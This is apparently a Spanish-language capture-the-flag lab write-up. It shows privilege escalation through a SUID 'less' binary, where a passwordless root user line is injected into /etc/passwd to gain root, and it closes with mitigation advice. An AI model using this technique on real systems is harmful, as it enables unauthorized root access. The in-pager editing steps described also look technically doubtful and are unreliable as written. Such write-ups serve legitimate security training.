## Información General

| Campo | Valor |
|---|---|
| **Plataforma** | whoami-labs |
| **Dificultad** | Fácil |
| **Autor** | elc0ket |

## Técnicas Usadas

Escalada de privilegios mediante binario SUID (`less`), inyección de usuario en `/etc/passwd`.

---

## Fase 1: Acceso Inicial

Las credenciales se proporcionan directamente en el laboratorio:

- **Usuario:** `hacker`
- **Contraseña:** `h4ck3r123`

```bash
ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
ssh hacker@172.17.0.2
```

![[IMG-20260627185007308.png]]

---

## Fase 2: Escalada de Privilegios

### Enumeración de Binarios SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binarios destacados:

![[IMG-20260627185035583.png]]
### Explotación con `less`

`less` con SUID permite escribir en archivos del sistema como `root`. Lo usamos para inyectar un usuario sin contraseña directamente en `/etc/passwd`:

```bash
echo "admin::0:0:root:/root:/bin/bash" | /usr/bin/less /etc/passwd
```

Dentro de `less`:

````

A # Añadir línea al final del archivo  
:q # Guardar y salir

````

Migramos al nuevo usuario:

```bash
su admin
```

![[IMG-20260627185109482.png]]

### Captura de Flag

```bash
cd /root
cat flag.txt
```

![[IMG-20260627185302745.png]]

---

## Conclusión

### Resumen del Ataque

| Fase | Acción | Herramienta | Resultado |
|---|---|---|---|
| **1. Acceso Inicial** | Conexión SSH con credenciales del lab | `ssh` | Shell como `hacker` |
| **2. Enumeración** | Búsqueda de binarios SUID | `find` | `less` con SUID detectado |
| **3. Escalada** | Inyección de usuario en `/etc/passwd` | `less` | Usuario `admin` con UID 0 |
| **4. Root** | Migración a usuario `admin` | `su` | Control total del sistema |

### Medidas de Mitigación

| Vulnerabilidad | Riesgo | Medida Correctiva |
|---|---|---|
| **SUID en `less`** | Escritura en archivos del sistema como root | `chmod u-s /usr/bin/less` |
| **SUID en `vim.basic`** | Edición de archivos críticos como root | `chmod u-s /usr/bin/vim.basic` |
| **Credenciales en texto plano** | Exposición trivial de acceso | No mostrar credenciales en banners de bienvenida |

> [!warning] Principio de Mínimo Privilegio
> Herramientas de lectura/edición como `less`, `vim` o `nano` con SUID permiten modificar archivos del sistema arbitrariamente. Nunca deben tener el bit SUID activado.

> [!tip] Referencia
> Consultar [[GTFOBins]] → `less` para más técnicas de explotación SUID.
